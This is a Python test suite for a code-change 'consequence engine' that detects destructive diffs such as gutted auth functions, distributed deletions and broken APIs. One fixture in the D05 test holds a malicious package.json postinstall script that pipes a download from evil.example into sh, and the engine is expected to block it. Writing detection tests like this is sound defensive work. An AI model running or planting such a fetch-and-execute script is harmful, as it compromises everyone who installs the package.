"""
test_consequence_engine.py — Comprehensive Test Suite for SCG & Consequence Engine
===================================================================================

Validates:
  - Task 1 (D01): Parser completeness states (AVAILABLE, PARSE_ERROR,
    GRAMMAR_UNAVAILABLE, UNSUPPORTED_EXTENSION) and capability vectors.
  - Task 2 (SymbolFact v1): Multi-language extraction across Python, JS, TS,
    TSX, Go, Rust, and Java; comment/whitespace hash invariance; stub detection;
    call-site extraction; class-qualified method disambiguation; legacy compatibility.
  - Task 3 (D02): 5-stage symbol matching (S01 pure rename, S02 cross-file move,
    S03 rename/move with body gutting, S04 ambiguous refactor).
  - Task 4 (D03, D04, D05, D06):
    - C01: Distributed cross-file deletion (A03 pattern) -> BLOCK
    - C02: Paired 5-file pure move refactor -> SAFE (zero false positives)
    - C03: Threshold-gaming deletion with getter/docstring dilution (A06 pattern) -> BLOCK
    - C04: Benign private dead-code cleanup -> SAFE
    - D04: Unresolved cross-file callers, visibility reduction, required param increase
    - D05: Manifest/lockfile mismatch and lifecycle script injection
    - D06: Security decorator and rollback/validation guard removal
"""

import json
from unittest.mock import patch
import pytest

import structural_parser
from structural_parser import (
    PARSER_STATUS_AVAILABLE,
    PARSER_STATUS_GRAMMAR_UNAVAILABLE,
    PARSER_STATUS_PARSE_ERROR,
    PARSER_STATUS_UNSUPPORTED_EXTENSION,
    SymbolFact,
    extract_named_nodes,
    extract_symbols,
    get_parser_capabilities,
)
from consequence_engine import (
    CONSEQUENCE_SCHEMA_VERSION,
    DETECTOR_D01_PARSER,
    DETECTOR_D02_AMBIGUOUS,
    DETECTOR_D02_WEAKENING,
    DETECTOR_D03_COMPOUND,
    DETECTOR_D04_API,
    DETECTOR_D05_BUILD,
    DETECTOR_D06_GUARD,
    DETECTOR_D08_WORKFLOW,
    DETECTOR_D09_TEST,
    DETECTOR_D10_MIGRATION,
    POLICY_BLOCK,
    POLICY_PASS,
    POLICY_REVIEW,
    POLICY_WARN,
    TIER_INCOMPLETE,
    TIER_LIKELY,
    TIER_VERIFIED,
    ConsequenceEngine,
    FileDeltaInput,
    match_symbols_5_stage,
)


# ==============================================================================
# 1. PARSER COMPLETENESS & CAPABILITY VECTOR TESTS (D01 / X01, X02, X05)
# ==============================================================================

class TestParserCompletenessD01:
    def test_x01_missing_grammar_never_silently_returns_complete(self):
        """X01: When a Tree-sitter grammar is unavailable, status is GRAMMAR_UNAVAILABLE and complete=False."""
        with patch.object(structural_parser, "_load_language", return_value=None):
            pr = extract_symbols("export function foo() { return 1; }", "src/api.ts")
            assert pr.status == PARSER_STATUS_GRAMMAR_UNAVAILABLE
            assert pr.complete is False
            assert pr.capabilities["syntax"]["state"] == "unavailable"

            engine = ConsequenceEngine(mode="enforce")
            rep = engine.analyze_deltas([
                FileDeltaInput(
                    file_path="src/api.ts",
                    change_type="M",
                    base_source="export function foo() { return 1; }",
                    head_source="export function foo() { return 2; }",
                )
            ])
            assert rep.parser_completeness["complete"] is False
            d01 = [f for f in rep.findings if f.detector_id == DETECTOR_D01_PARSER]
            assert len(d01) == 1
            assert d01[0].tier == TIER_INCOMPLETE
            assert d01[0].consequence_class == "ANALYSIS_INCOMPLETE"

    def test_x02_python_syntax_error_reports_parse_error(self):
        """X02: Python SyntaxError sets status=PARSE_ERROR, complete=False, and triggers D01."""
        bad_py = "def broken(a, b\n    return a + b\n"
        pr = extract_symbols(bad_py, "auth.py")
        assert pr.status == PARSER_STATUS_PARSE_ERROR
        assert pr.complete is False
        assert pr.capabilities["syntax"]["state"] == "failed"

        engine = ConsequenceEngine(mode="enforce")
        rep = engine.analyze_deltas([
            FileDeltaInput(
                file_path="auth.py",
                change_type="M",
                base_source="def broken(a, b):\n    return a + b\n",
                head_source=bad_py,
            )
        ])
        d01 = [f for f in rep.findings if f.detector_id == DETECTOR_D01_PARSER]
        assert len(d01) == 1
        assert d01[0].policy_recommendation == POLICY_REVIEW

    def test_x02_treesitter_syntax_error_reports_parse_error(self):
        """X02: Tree-sitter syntax error node sets status=PARSE_ERROR and complete=False."""
        bad_js = "function valid() { return 1; }\nfunction broken( { return ; \n"
        pr = extract_symbols(bad_js, "api.js")
        assert pr.status == PARSER_STATUS_PARSE_ERROR
        assert pr.complete is False
        assert pr.capabilities["syntax"]["state"] == "partial"

    def test_x05_unsupported_extension_explicit_status(self):
        """X05: Unsupported extension returns UNSUPPORTED_EXTENSION, never complete=True."""
        pr = extract_symbols("SELECT * FROM users;", "schema.sql")
        assert pr.status == PARSER_STATUS_UNSUPPORTED_EXTENSION
        assert pr.complete is False
        assert pr.language is None

    # X06 (AUDIT_LOG §V4): changed source code with no structural parser must be
    # reported as incomplete coverage, never silently treated as fully analysed.

    @pytest.mark.parametrize("path, base, head", [
        ("lib/auth.rb",
         "def verify(t)\n  return false if t.nil?\n  check(t)\nend\n",
         "def verify(t)\n  true\nend\n"),
        ("src/Auth.cs",
         "class A { bool V(string t) { if (t == null) return false; return C(t); } }",
         "class A { bool V(string t) { return true; } }"),
        ("src/Auth.kt",
         "fun verify(t: String?): Boolean {\n  if (t == null) return false\n  return check(t)\n}\n",
         "fun verify(t: String?): Boolean {\n  return true\n}\n"),
    ], ids=["ruby", "csharp", "kotlin"])
    def test_x06_unsupported_source_change_reports_incomplete_coverage(self, path, base, head):
        rep = ConsequenceEngine(mode="enforce").analyze_deltas([
            FileDeltaInput(file_path=path, change_type="M", base_source=base, head_source=head)
        ])
        d01 = [f for f in rep.findings if f.detector_id == DETECTOR_D01_PARSER]
        assert len(d01) == 1
        finding = d01[0]
        assert finding.affected_files == (path,)
        assert finding.evidence[0].kind == PARSER_STATUS_UNSUPPORTED_EXTENSION
        assert finding.tier == TIER_INCOMPLETE
        assert finding.policy_recommendation == POLICY_WARN
        assert "'None'" not in finding.remediation
        assert "manually" in finding.remediation
        assert rep.parser_completeness["complete"] is False
        assert [s["file_path"] for s in rep.parser_completeness["incomplete_snapshots"]] == [path, path]
        assert rep.capabilities["syntax"]["state"] == "unavailable"
        # Advisory only: a WARN finding does not change the recommended verdict.
        assert rep.recommended_verdict == "SAFE"

    def test_x06_added_and_deleted_unsupported_source_reported(self):
        rep = ConsequenceEngine(mode="enforce").analyze_deltas([
            FileDeltaInput(file_path="lib/new_auth.rb", change_type="A", head_source="def verify(t)\n  true\nend\n"),
            FileDeltaInput(file_path="lib/old_auth.php", change_type="D",
                           base_source="<?php function verify($t) { return check($t); }"),
        ])
        d01 = sorted(f.affected_files[0] for f in rep.findings if f.detector_id == DETECTOR_D01_PARSER)
        assert d01 == ["lib/new_auth.rb", "lib/old_auth.php"]
        assert rep.parser_completeness["complete"] is False

    def test_x06_non_code_files_stay_out_of_parser_coverage(self):
        deltas = [
            FileDeltaInput(file_path=p, change_type="M", base_source="a\n", head_source="b\n")
            for p in ("README.md", "config/settings.yml", "data/users.json", "db/schema.sql", "Dockerfile", "notes.txt")
        ]
        rep = ConsequenceEngine(mode="enforce").analyze_deltas(deltas)
        assert [f for f in rep.findings if f.detector_id == DETECTOR_D01_PARSER] == []
        assert rep.parser_completeness["complete"] is True
        assert rep.parser_completeness["total_snapshots_parsed"] == 0
        assert rep.capabilities["syntax"]["state"] == "available"

    def test_x06_supported_analysis_unchanged_alongside_unsupported_file(self):
        py_delta = FileDeltaInput(
            file_path="auth.py",
            change_type="M",
            base_source=(
                "class Auth:\n"
                "    def verify(self, password, hashed):\n"
                "        digest = hash_pw(password)\n"
                "        if not compare(digest, hashed):\n"
                "            return False\n"
                "        return True\n"
            ),
            head_source="class Auth:\n    def verify(self, password, hashed):\n        pass\n",
        )
        rb_delta = FileDeltaInput(file_path="lib/util.rb", change_type="M",
                                  base_source="def a\n  1\nend\n", head_source="def a\n  2\nend\n")
        alone = ConsequenceEngine(mode="enforce").analyze_deltas([py_delta])
        mixed = ConsequenceEngine(mode="enforce").analyze_deltas([py_delta, rb_delta])

        def non_d01(rep):
            return sorted((f.detector_id, f.consequence_class, f.policy_recommendation)
                          for f in rep.findings if f.detector_id != DETECTOR_D01_PARSER)

        assert non_d01(mixed) == non_d01(alone)
        assert (DETECTOR_D02_WEAKENING, "BODY_GUTTED", POLICY_BLOCK) in non_d01(mixed)
        assert mixed.graph_summary["transition_counts"] == alone.graph_summary["transition_counts"]
        assert mixed.recommended_verdict == alone.recommended_verdict == "DESTRUCTIVE"
        assert [f.affected_files for f in mixed.findings if f.detector_id == DETECTOR_D01_PARSER] == [("lib/util.rb",)]
        assert mixed.capabilities["syntax"]["state"] == "partial"
        assert alone.parser_completeness["complete"] is True
        assert mixed.parser_completeness["complete"] is False

    # X07 (AUDIT_LOG §V7): JS/TS module extensions use the installed JS/TS grammars
    # and produce exactly what the base extension produces.

    _V7_ESM = (
        "export function verify(token) {\n  if (!token) { return false; }\n  return checkSig(token);\n}\n"
        "export class Session {\n  open(user) { return start(user); }\n}\n"
    )
    _V7_CJS = (
        "function verify(token) {\n  if (!token) { return false; }\n  return checkSig(token);\n}\n"
        "module.exports = { verify };\n"
    )
    _V7_TS = (
        "export interface Claims { sub: string }\n"
        "export function verify(token: string): boolean {\n  if (!token) { return false; }\n  return checkSig(token);\n}\n"
    )

    @pytest.mark.parametrize("ext, ref_ext, src", [
        (".mjs", ".js", _V7_ESM),
        (".cjs", ".js", _V7_CJS),
        (".mts", ".ts", _V7_TS),
        (".cts", ".ts", _V7_TS),
    ], ids=["mjs", "cjs", "mts", "cts"])
    def test_x07_module_extension_parses_like_base_extension(self, ext, ref_ext, src):
        ref = extract_symbols(src, "lib/auth" + ref_ext)
        got = extract_symbols(src, "lib/auth" + ext)
        assert got.status == PARSER_STATUS_AVAILABLE and got.complete is True
        assert got.language == ref.language

        def facts(pr):
            return sorted((s.kind, s.qualified_name, s.body_hash, s.normalized_signature, s.is_exported)
                          for s in pr.symbols)

        assert facts(ref)
        assert facts(got) == facts(ref)
        assert extract_named_nodes(src, "lib/auth" + ext) == extract_named_nodes(src, "lib/auth" + ref_ext)

    @pytest.mark.parametrize("ext, ref_ext", [(".mjs", ".js"), (".cjs", ".js"), (".mts", ".ts"), (".cts", ".ts")],
                             ids=["mjs", "cjs", "mts", "cts"])
    def test_x07_gutting_in_module_extension_matches_base_extension(self, ext, ref_ext):
        base = (
            "export function verify(token) {\n"
            "  if (!token) { throw new Error('missing'); }\n"
            "  const ok = verifySignature(token);\n"
            "  if (!ok) { return false; }\n"
            "  return true;\n"
            "}\n"
        )
        head = "export function verify(token) {\n  return true;\n}\n"

        def run(path):
            rep = ConsequenceEngine(mode="enforce").analyze_deltas([
                FileDeltaInput(file_path=path, change_type="M", base_source=base, head_source=head)
            ])
            return rep, sorted((f.detector_id, f.consequence_class, f.policy_recommendation) for f in rep.findings)

        ref_rep, ref_findings = run("api/auth" + ref_ext)
        got_rep, got_findings = run("api/auth" + ext)
        assert got_findings == ref_findings
        assert any(pol == POLICY_BLOCK for _d, _c, pol in got_findings)
        assert all(d != DETECTOR_D01_PARSER for d, _c, _p in got_findings)
        assert got_rep.recommended_verdict == ref_rep.recommended_verdict == "DESTRUCTIVE"

    def test_parser_capabilities_probe(self):
        """Verify runtime capability probe reports all 7 language keys."""
        caps = get_parser_capabilities()
        for lang in ("python", "javascript", "typescript", "tsx", "go", "rust", "java"):
            assert lang in caps
            assert caps[lang]["available"] is True


# ==============================================================================
# 2. MULTI-LANGUAGE SYMBOLFACT V1 EXTRACTION TESTS (TASK 2)
# ==============================================================================

class TestSymbolFactMultiLanguage:
    def test_python_qualified_methods_fix_flat_set_collision(self):
        """Two classes with same-named methods produce distinct qualified SymbolFacts."""
        src = (
            "class SessionManager:\n"
            "    def validate(self, token: str) -> bool:\n"
            "        return len(token) > 10\n\n"
            "class PasswordValidator:\n"
            "    def validate(self, password: str) -> bool:\n"
            "        return len(password) >= 8\n"
        )
        # Legacy flat set collides on 'validate'
        legacy = extract_named_nodes(src, "auth.py")
        assert legacy == {"SessionManager", "PasswordValidator", "validate"}

        # SymbolFact v1 disambiguates via qualified_name
        pr = extract_symbols(src, "auth.py")
        assert pr.complete is True
        quals = {s.qualified_name for s in pr.symbols}
        assert quals == {
            "SessionManager",
            "SessionManager.validate",
            "PasswordValidator",
            "PasswordValidator.validate",
        }

    def test_body_hash_invariant_to_comments_and_docstrings(self):
        """Normalized body_hash ignores docstrings, comments, and formatting changes."""
        v1 = (
            "def compute(x: int, y: int) -> int:\n"
            "    return x + y\n"
        )
        v2 = (
            "def compute(x: int, y: int) -> int:\n"
            '    """Added detailed docstring explaining compute."""\n'
            "    # Additional inline comment\n"
            "    return (x + y)\n"
        )
        s1 = extract_symbols(v1, "math_util.py").symbols[0]
        s2 = extract_symbols(v2, "math_util.py").symbols[0]
        assert s1.body_hash == s2.body_hash
        assert s1.is_stub is False

    def test_javascript_commonjs_exports_and_no_local_var_leak(self):
        """JS module.exports marks exported functions and local const inside function is not a top-level symbol."""
        js_src = (
            "async function fetchUser(id) {\n"
            "  const response = await fetch(`/users/${id}`);\n"
            "  return response.json();\n"
            "}\n"
            "function _internalHelper(x) { return x + 1; }\n"
            "module.exports = { fetchUser };\n"
        )
        pr = extract_symbols(js_src, "api.js")
        assert pr.complete is True
        by_name = {s.qualified_name: s for s in pr.symbols}
        assert "fetchUser" in by_name
        assert by_name["fetchUser"].is_exported is True
        assert by_name["fetchUser"].visibility == "public"
        assert "_internalHelper" in by_name
        assert by_name["_internalHelper"].is_exported is False
        assert "response" not in by_name  # Local variable inside fetchUser must not leak

    def test_typescript_classes_interfaces_and_methods(self):
        ts_src = (
            "export interface AlertPayload {\n"
            "  message: string;\n"
            "}\n"
            "export class NotificationService {\n"
            "  public sendAlert(userId: string, msg: string): boolean {\n"
            "    console.log(userId, msg);\n"
            "    return true;\n"
            "  }\n"
            "}\n"
        )
        pr = extract_symbols(ts_src, "services.ts")
        assert pr.complete is True
        by_qual = {s.qualified_name: s for s in pr.symbols}
        assert by_qual["AlertPayload"].kind == "interface"
        assert by_qual["NotificationService"].kind == "class"
        assert by_qual["NotificationService.sendAlert"].kind == "method"
        assert by_qual["NotificationService.sendAlert"].is_exported is True
        assert by_qual["NotificationService.sendAlert"].required_parameter_count == 2

    def test_go_structs_methods_and_export_casing(self):
        go_src = (
            "package utils\n\n"
            "type Server struct {\n"
            "    Port int\n"
            "}\n\n"
            "func (s *Server) Start() error {\n"
            "    return nil\n"
            "}\n\n"
            "func WriteError(code int, msg string) {\n"
            "    println(code, msg)\n"
            "}\n\n"
            "func internalHelper() int {\n"
            "    return 42\n"
            "}\n"
        )
        pr = extract_symbols(go_src, "utils.go")
        assert pr.complete is True
        by_qual = {s.qualified_name: s for s in pr.symbols}
        assert by_qual["Server"].kind == "struct"
        assert by_qual["Server"].is_exported is True
        assert by_qual["Server.Start"].kind == "method"
        assert by_qual["Server.Start"].parent_symbol == "Server"
        assert by_qual["WriteError"].is_exported is True
        assert by_qual["internalHelper"].is_exported is False
        assert by_qual["internalHelper"].visibility == "private"

    def test_rust_structs_traits_and_impl_methods(self):
        rs_src = (
            "pub struct TokenValidator {\n"
            "    secret: String,\n"
            "}\n"
            "impl TokenValidator {\n"
            "    pub fn verify(&self, token: &str) -> bool {\n"
            "        !token.is_empty()\n"
            "    }\n"
            "    fn rotate(&mut self) {\n"
            "        self.secret.clear();\n"
            "    }\n"
            "}\n"
        )
        pr = extract_symbols(rs_src, "validator.rs")
        assert pr.complete is True
        by_qual = {s.qualified_name: s for s in pr.symbols}
        assert by_qual["TokenValidator"].kind == "struct"
        assert by_qual["TokenValidator"].is_exported is True
        assert by_qual["TokenValidator.verify"].kind == "method"
        assert by_qual["TokenValidator.verify"].is_exported is True
        assert by_qual["TokenValidator.rotate"].is_exported is False

    def test_java_classes_annotations_and_visibility(self):
        java_src = (
            "public class AuthController {\n"
            "    @Secured\n"
            "    public boolean deleteAccount(String userId) {\n"
            "        auditLog(userId);\n"
            "        return true;\n"
            "    }\n"
            "    private void auditLog(String userId) {\n"
            "        System.out.println(userId);\n"
            "    }\n"
            "}\n"
        )
        pr = extract_symbols(java_src, "AuthController.java")
        assert pr.complete is True
        by_qual = {s.qualified_name: s for s in pr.symbols}
        assert by_qual["AuthController"].kind == "class"
        assert by_qual["AuthController.deleteAccount"].visibility == "public"
        assert "@Secured" in by_qual["AuthController.deleteAccount"].decorators
        assert by_qual["AuthController.auditLog"].visibility == "private"


# ==============================================================================
# 3. 5-STAGE SYMBOL MATCHING & RENAME/WEAKENING TESTS (D02 / S01 - S04)
# ==============================================================================

class TestSymbolMatchingD02:
    def test_s01_pure_class_and_method_rename_is_safe(self):
        """S01: Renaming 100% of classes in a file with intact methods produces 0 unmatched removals and SAFE."""
        base_py = (
            "class SessionManager:\n"
            "    def create(self, user_id: str) -> str:\n"
            "        token = f'tok_{user_id}'\n"
            "        return token\n"
            "    def revoke(self, token: str) -> bool:\n"
            "        return token.startswith('tok_')\n"
        )
        head_py = (
            "class SessionStore:\n"
            "    def create(self, user_id: str) -> str:\n"
            "        token = f'tok_{user_id}'\n"
            "        return token\n"
            "    def revoke(self, token: str) -> bool:\n"
            "        return token.startswith('tok_')\n"
        )
        engine = ConsequenceEngine(mode="enforce")
        rep = engine.analyze_deltas([
            FileDeltaInput(file_path="auth.py", change_type="M", base_source=base_py, head_source=head_py)
        ])
        assert rep.recommended_verdict == "SAFE"
        assert rep.graph_summary["transition_counts"].get("REMOVED", 0) == 0
        assert rep.graph_summary["transition_counts"].get("RENAMED", 0) == 3
        assert rep.findings == []

    def test_s02_cross_file_move_is_safe(self):
        """S02: Moving classes/functions from auth.py to identity.py with intact bodies is SAFE."""
        base_py = (
            "def verify_signature(payload: bytes, sig: str) -> bool:\n"
            "    expected = payload.hex()\n"
            "    return expected == sig\n"
        )
        engine = ConsequenceEngine(mode="enforce")
        rep = engine.analyze_deltas([
            FileDeltaInput(file_path="auth.py", change_type="D", base_source=base_py, head_source=None),
            FileDeltaInput(file_path="identity.py", change_type="A", base_source=None, head_source=base_py),
        ])
        assert rep.recommended_verdict == "SAFE"
        assert rep.graph_summary["transition_counts"].get("MOVED", 0) == 1
        assert rep.graph_summary["transition_counts"].get("REMOVED", 0) == 0
        assert rep.findings == []

    def test_s03_rename_with_body_weakening_blocks(self):
        """S03: Renaming or moving symbols while gutting their bodies to stubs triggers D02_BODY_WEAKENING (BLOCK)."""
        base_py = (
            "class PasswordValidator:\n"
            "    def validate(self, password: str) -> bool:\n"
            "        if len(password) < 12:\n"
            "            return False\n"
            "        return any(c.isdigit() for c in password)\n"
            "    def verify_password(self, password: str, hashed: str) -> bool:\n"
            "        computed = self._hash(password)\n"
            "        return computed == hashed\n"
        )
        head_py = (
            "class CredentialValidator:\n"
            "    def validate(self, password: str) -> bool:\n"
            "        pass\n"
            "    def verify_password(self, password: str, hashed: str) -> bool:\n"
            "        pass\n"
        )
        engine = ConsequenceEngine(mode="enforce")
        rep = engine.analyze_deltas([
            FileDeltaInput(file_path="auth.py", change_type="M", base_source=base_py, head_source=head_py)
        ])
        assert rep.recommended_verdict == "DESTRUCTIVE"
        d02 = [f for f in rep.findings if f.detector_id == DETECTOR_D02_WEAKENING]
        assert len(d02) == 1
        assert d02[0].consequence_class == "RENAME_WITH_BODY_WEAKENING"
        assert d02[0].tier == TIER_VERIFIED
        assert d02[0].policy_recommendation == POLICY_BLOCK

    def test_s04_ambiguous_refactor_emits_incomplete_warning(self):
        """S04: Replacing 1 function with 2 identically-bodied candidates emits D02_AMBIGUOUS_REFACTOR."""
        base_py = (
            "def normalize_id(raw: str) -> str:\n"
            "    cleaned = raw.strip().lower()\n"
            "    return cleaned\n"
        )
        head_py = (
            "def normalize_user_id(raw: str) -> str:\n"
            "    cleaned = raw.strip().lower()\n"
            "    return cleaned\n\n"
            "def normalize_account_id(raw: str) -> str:\n"
            "    cleaned = raw.strip().lower()\n"
            "    return cleaned\n"
        )
        engine = ConsequenceEngine(mode="enforce")
        rep = engine.analyze_deltas([
            FileDeltaInput(file_path="ids.py", change_type="M", base_source=base_py, head_source=head_py)
        ])
        d02_amb = [f for f in rep.findings if f.detector_id == DETECTOR_D02_AMBIGUOUS]
        assert len(d02_amb) == 1
        assert d02_amb[0].tier == TIER_INCOMPLETE
        assert d02_amb[0].policy_recommendation == POLICY_WARN


# ==============================================================================
# 4. COMPOUND LOSS, THRESHOLD GAMING, API BREAKS, BUILD & GUARDS (D03-D06)
# ==============================================================================

class TestCompoundAndAdversarialDetectors:
    def test_c01_distributed_cross_file_loss_blocks(self):
        """C01 (A03 pattern): 4 files each losing 1 security/exported function (<20% per file) triggers D03 BLOCK."""
        deltas = [
            FileDeltaInput(
                file_path="auth.py",
                change_type="M",
                base_source=(
                    "class Auth:\n"
                    "    def login(self, u): return bool(u)\n"
                    "    def logout(self, u): return bool(u)\n"
                    "    def register(self, u): return bool(u)\n"
                    "    def verify(self, u): return bool(u)\n"
                    "    def refresh(self, u): return bool(u)\n"
                    "    def deactivate(self, u):\n"
                    "        self.logout(u)\n"
                    "        return True\n"
                ),
                head_source=(
                    "class Auth:\n"
                    "    def login(self, u): return bool(u)\n"
                    "    def logout(self, u): return bool(u)\n"
                    "    def register(self, u): return bool(u)\n"
                    "    def verify(self, u): return bool(u)\n"
                    "    def refresh(self, u): return bool(u)\n"
                ),
            ),
            FileDeltaInput(
                file_path="api.js",
                change_type="M",
                base_source=(
                    "function getUser(id) { return id; }\n"
                    "function listUsers() { return []; }\n"
                    "function createUser(u) { return u; }\n"
                    "function deleteUser(id) { return id; }\n"
                    "function updateUser(id, d) { return d; }\n"
                    "module.exports = { getUser, listUsers, createUser, deleteUser, updateUser };\n"
                ),
                head_source=(
                    "function getUser(id) { return id; }\n"
                    "function listUsers() { return []; }\n"
                    "function createUser(u) { return u; }\n"
                    "function deleteUser(id) { return id; }\n"
                    "module.exports = { getUser, listUsers, createUser, deleteUser };\n"
                ),
            ),
            FileDeltaInput(
                file_path="services.ts",
                change_type="M",
                base_source=(
                    "export class NotificationService {\n"
                    "  public notify(u: string): boolean { return true; }\n"
                    "  public sendEmail(u: string): boolean { return true; }\n"
                    "  public sendSms(u: string): boolean { return true; }\n"
                    "  public sendPush(u: string): boolean { return true; }\n"
                    "  public sendAlert(u: string): boolean { console.log(u); return true; }\n"
                    "}\n"
                ),
                head_source=(
                    "export class NotificationService {\n"
                    "  public notify(u: string): boolean { return true; }\n"
                    "  public sendEmail(u: string): boolean { return true; }\n"
                    "  public sendSms(u: string): boolean { return true; }\n"
                    "  public sendPush(u: string): boolean { return true; }\n"
                    "}\n"
                ),
            ),
        ]
        repo_head = {
            "test_auth.py": (
                "def test_deactivate():\n"
                "    auth = Auth()\n"
                "    auth.deactivate('alice')\n"
            )
        }
        engine = ConsequenceEngine(mode="enforce")
        rep = engine.analyze_deltas(deltas, repo_head_files=repo_head)
        assert rep.recommended_verdict == "DESTRUCTIVE"
        d03 = [f for f in rep.findings if f.detector_id == DETECTOR_D03_COMPOUND]
        assert len(d03) == 1
        assert d03[0].consequence_class == "DISTRIBUTED_SYMBOL_LOSS"
        assert d03[0].policy_recommendation == POLICY_BLOCK

    def test_c02_five_file_pure_move_refactor_is_safe(self):
        """C02: Moving 4 functions out of 4 files into a shared module is matched as MOVED and stays SAFE."""
        f1 = "def validate_token(tok: str) -> bool:\n    return tok.startswith('v1_')\n"
        f2 = "def sanitize_input(raw: str) -> str:\n    return raw.replace('<', '')\n"
        f3 = "def check_permission(role: str) -> bool:\n    return role == 'admin'\n"
        f4 = "def verify_checksum(data: str) -> bool:\n    return len(data) > 0\n"
        keep = "def keep_alive() -> bool:\n    return True\n"

        deltas = [
            FileDeltaInput("m1.py", change_type="M", base_source=keep + f1, head_source=keep),
            FileDeltaInput("m2.py", change_type="M", base_source=keep + f2, head_source=keep),
            FileDeltaInput("m3.py", change_type="M", base_source=keep + f3, head_source=keep),
            FileDeltaInput("m4.py", change_type="M", base_source=keep + f4, head_source=keep),
            FileDeltaInput("shared_security.py", change_type="A", base_source=None, head_source=f1 + f2 + f3 + f4),
        ]
        engine = ConsequenceEngine(mode="enforce")
        rep = engine.analyze_deltas(deltas)
        assert rep.recommended_verdict == "SAFE"
        assert rep.graph_summary["transition_counts"].get("MOVED", 0) == 4
        assert rep.graph_summary["transition_counts"].get("REMOVED", 0) == 0
        assert [f for f in rep.findings if f.detector_id == DETECTOR_D03_COMPOUND] == []

    def test_c03_threshold_gaming_dilution_blocks(self):
        """C03 (A06 pattern): Deleting 3 security methods while adding 3 trivial 1-line getters + padding triggers D03 BLOCK."""
        base_auth = (
            "class SessionManager:\n"
            "    def create(self, u: str) -> str:\n"
            "        return f's_{u}'\n"
            "    def revoke_all(self, u: str) -> int:\n"
            "        count = len(u)\n"
            "        return count\n\n"
            "class Auth:\n"
            "    def login(self, u: str) -> bool:\n"
            "        return bool(u)\n"
            "    def logout_all(self, u: str) -> int:\n"
            "        count = len(u)\n"
            "        return count\n"
            "    def deactivate(self, u: str) -> bool:\n"
            "        self.logout_all(u)\n"
            "        return True\n"
        )
        head_auth = (
            "class SessionManager:\n"
            "    def create(self, u: str) -> str:\n"
            "        return f's_{u}'\n\n"
            "class Auth:\n"
            "    def login(self, u: str) -> bool:\n"
            "        return bool(u)\n"
            "    def get_user_count(self) -> int:\n"
            "        return 0\n"
            "    def get_session_count(self) -> int:\n"
            "        return 0\n"
            "    def is_active(self, u: str) -> bool:\n"
            "        return True\n"
        )
        repo_head = {
            "test_auth.py": (
                "def test_revocation():\n"
                "    sm = SessionManager()\n"
                "    sm.revoke_all('alice')\n"
                "    auth = Auth()\n"
                "    auth.deactivate('alice')\n"
            )
        }
        engine = ConsequenceEngine(mode="enforce")
        rep = engine.analyze_deltas(
            [FileDeltaInput("auth.py", change_type="M", base_source=base_auth, head_source=head_auth, lines_added=150, lines_deleted=25)],
            repo_head_files=repo_head,
        )
        assert rep.recommended_verdict == "DESTRUCTIVE"
        d03 = [f for f in rep.findings if f.detector_id == DETECTOR_D03_COMPOUND]
        d04 = [f for f in rep.findings if f.detector_id == DETECTOR_D04_API]
        assert len(d03) == 1
        assert d03[0].consequence_class == "THRESHOLD_GAMING_DELETION"
        assert d03[0].policy_recommendation == POLICY_BLOCK
        assert len(d04) >= 1
        assert any(f.consequence_class == "UNRESOLVED_CALLER" for f in d04)

    def test_c04_benign_private_dead_code_cleanup_is_safe(self):
        """C04: Removing unreferenced private helper functions across files without callers or exports stays SAFE."""
        deltas = [
            FileDeltaInput(
                "u1.py",
                change_type="M",
                base_source="def public_a(x): return x + 1\ndef _unused_fmt_1(x): return str(x).strip()\n",
                head_source="def public_a(x): return x + 1\n",
            ),
            FileDeltaInput(
                "u2.py",
                change_type="M",
                base_source="def public_b(x): return x + 2\ndef _unused_fmt_2(x): return str(x).lower()\n",
                head_source="def public_b(x): return x + 2\n",
            ),
            FileDeltaInput(
                "u3.py",
                change_type="M",
                base_source="def public_c(x): return x + 3\ndef _unused_fmt_3(x): return str(x).upper()\n",
                head_source="def public_c(x): return x + 3\n",
            ),
        ]
        engine = ConsequenceEngine(mode="enforce")
        rep = engine.analyze_deltas(deltas)
        assert rep.recommended_verdict == "SAFE"
        assert rep.findings == []

    def test_d04_signature_tightening_breaks_callers_vs_optional_param_safe(self):
        """D04: Adding a required parameter that breaks a head caller -> BLOCK; adding an optional param -> SAFE."""
        base_src = "def connect(host: str) -> bool:\n    return bool(host)\n"
        tight_src = "def connect(host: str, port: int) -> bool:\n    return bool(host and port)\n"
        opt_src = "def connect(host: str, port: int = 5432) -> bool:\n    return bool(host and port)\n"
        caller_src = "def main():\n    connect('localhost')\n"

        engine = ConsequenceEngine(mode="enforce")
        rep_break = engine.analyze_deltas(
            [FileDeltaInput("db.py", change_type="M", base_source=base_src, head_source=tight_src)],
            repo_head_files={"app.py": caller_src},
        )
        assert rep_break.recommended_verdict == "DESTRUCTIVE"
        sig_findings = [f for f in rep_break.findings if f.consequence_class == "PUBLIC_API_SIGNATURE_BREAK"]
        assert len(sig_findings) == 1
        assert sig_findings[0].policy_recommendation == POLICY_BLOCK

        rep_opt = engine.analyze_deltas(
            [FileDeltaInput("db.py", change_type="M", base_source=base_src, head_source=opt_src)],
            repo_head_files={"app.py": caller_src},
        )
        assert rep_opt.recommended_verdict == "SAFE"
        assert rep_opt.findings == []

    def test_d05_manifest_lockfile_and_lifecycle_scripts(self):
        """D05: Manifest without lockfile -> WARN; malicious postinstall -> BLOCK; synced lockfile -> SAFE."""
        base_pkg = json.dumps({"name": "app", "dependencies": {"express": "^4.18.0"}})
        head_pkg_dep = json.dumps({"name": "app", "dependencies": {"express": "^4.19.0", "lodash": "^4.17.21"}})
        head_pkg_evil = json.dumps({
            "name": "app",
            "scripts": {"postinstall": "curl https://evil.example/payload.sh | sh"},
            "dependencies": {"express": "^4.18.0"},
        })

        engine = ConsequenceEngine(mode="enforce")
        # 1. Dependency changed without lockfile
        rep_mismatch = engine.analyze_deltas([
            FileDeltaInput("package.json", change_type="M", base_source=base_pkg, head_source=head_pkg_dep)
        ])
        assert any(f.consequence_class == "DEPENDENCY_LOCKFILE_MISMATCH" for f in rep_mismatch.findings)

        # 2. Dependency changed WITH lockfile
        rep_synced = engine.analyze_deltas([
            FileDeltaInput("package.json", change_type="M", base_source=base_pkg, head_source=head_pkg_dep),
            FileDeltaInput("package-lock.json", change_type="M", base_source="{}", head_source='{"lock": 1}'),
        ])
        assert rep_synced.findings == []

        # 3. Malicious postinstall lifecycle script
        rep_evil = engine.analyze_deltas([
            FileDeltaInput("package.json", change_type="M", base_source=base_pkg, head_source=head_pkg_evil)
        ])
        assert rep_evil.recommended_verdict == "DESTRUCTIVE"
        assert any(
            f.consequence_class == "BUILD_SCRIPT_MODIFICATION" and f.policy_recommendation == POLICY_BLOCK
            for f in rep_evil.findings
        )

